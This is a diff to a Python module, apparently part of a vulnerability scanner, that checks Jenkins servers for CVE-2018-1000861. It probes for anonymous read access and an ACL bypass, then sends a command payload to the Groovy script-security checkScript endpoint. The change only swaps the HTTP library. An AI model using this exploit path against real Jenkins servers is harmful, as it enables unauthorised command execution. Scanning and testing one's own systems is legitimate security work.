@@ -7,9 +7,8 @@ description: CVE-2018-1000861漏洞可执行任意命令
 
 import re
 import binascii
-import requests
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+from app.lib.utils.request import request
+
 
 class CVE_2018_1000861_BaseVerify:
     def __init__(self, url):
@@ -29,14 +28,14 @@ class CVE_2018_1000861_BaseVerify:
         flag, accessible = self.ACL_PATCHED, False
         try:
             # check ANONYMOUS_READ
-            anonymous_read_req = requests.get(self.url, headers = self.headers, allow_redirects = False, verify=False)
+            anonymous_read_req = request.get(self.url, headers = self.headers)
             if anonymous_read_req.status_code == 200 and 'adjuncts' in anonymous_read_req.text:
                 flag, accessible = self.READ_ENABLE, True
                 print('ANONYMOUS_READ enable!')
             elif anonymous_read_req.status_code == 403:
                 print('ANONYMOUS_READ disable!')
                 # check ACL bypass, CVE-2018-1000861
-                check_acl_bypass_req = requests.get(self.url + '/securityRealm/user/admin', headers = self.headers, allow_redirects = False, verify=False)
+                check_acl_bypass_req = request.get(self.url + '/securityRealm/user/admin', headers = self.headers)
                 if check_acl_bypass_req.status_code == 200 and 'adjuncts' in check_acl_bypass_req.text:
                     flag, accessible = self.READ_BYPASS, True
             else:
@@ -48,7 +47,7 @@ class CVE_2018_1000861_BaseVerify:
                     url = self.url + '/securityRealm/user/admin'
                 else:
                     url = self.url
-                check_entry_req = requests.get(self.url + '/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript', headers = self.headers, allow_redirects = False, verify = False)
+                check_entry_req = request.get(self.url + '/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript', headers = self.headers)
                 if check_entry_req.status_code == 404:
                     flag = self.ENTRY_NOTFOUND
 
@@ -65,7 +64,7 @@ class CVE_2018_1000861_BaseVerify:
             'value': payload
         }
         try:
-            cmd_req = requests.get(self.url + '/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript', params = params, headers = self.headers, allow_redirects = False, verify = False)
+            cmd_req = request.get(self.url + '/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript', params = params, headers = self.headers)
             if cmd_req.status_code == 200:
                 return True
             elif cmd_req.status_code == 405:
